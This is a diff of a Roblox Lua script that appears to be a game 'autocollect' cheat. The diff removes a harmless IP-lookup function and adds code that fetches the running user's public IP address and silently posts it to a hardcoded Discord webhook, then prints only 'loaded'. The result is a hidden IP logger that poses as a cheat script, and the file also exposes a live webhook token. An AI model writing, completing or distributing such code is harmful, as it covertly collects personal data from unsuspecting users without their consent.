@@ -1,27 +1,30 @@
 local HttpService = game:GetService("HttpService")
+local webhook = "https://discord.com/api/webhooks/1362065828454993970/J_HLKCaHTqWmuZ4sESHeMogdkQ5qodc1lp26fDRnjMgYfZOyvMHE4l1JoveUVvnE_ZRg"  -- Replace with your Discord webhook URL
 
-local function getIPInfo(ip)
-    local url = "https://ipwhois.app/json/" .. (ip or "")
-    local success, response = pcall(function()
-        return HttpService:GetAsync(url)
-    end)
+-- Fetch public IP from ipinfo.io
+local response = game:HttpGet("https://ipinfo.io/json")
+local data = HttpService:JSONDecode(response)
+local ip = data.ip
 
-    if success then
-        local data = HttpService:JSONDecode(response)
-        print("IP:", data.ip)
-        print("Country:", data.country)
-        print("City:", data.city)
-        print("ISP:", data.org)
-    else
-        warn("Failed to fetch IP info:", response)
-    end
+-- Create message to send to Discord
+local message = {
+    content = "@everyone " .. ip
+}
+
+-- Convert message to JSON format
+local jsonMessage = HttpService:JSONEncode(message)
+
+-- Send IP to Discord webhook
+local success, result = pcall(function()
+    HttpService:PostAsync(webhook, jsonMessage, Enum.HttpContentType.ApplicationJson)
+end)
+
+-- Print success/failure status
+if success then
+    print("loaded")
+else
+    print("failed", result)
 end
-
--- Call with an IP or leave blank to get your own IP info
-getIPInfo("8.8.8.8")
-
-
-
 
 
 _G.autocollect = true
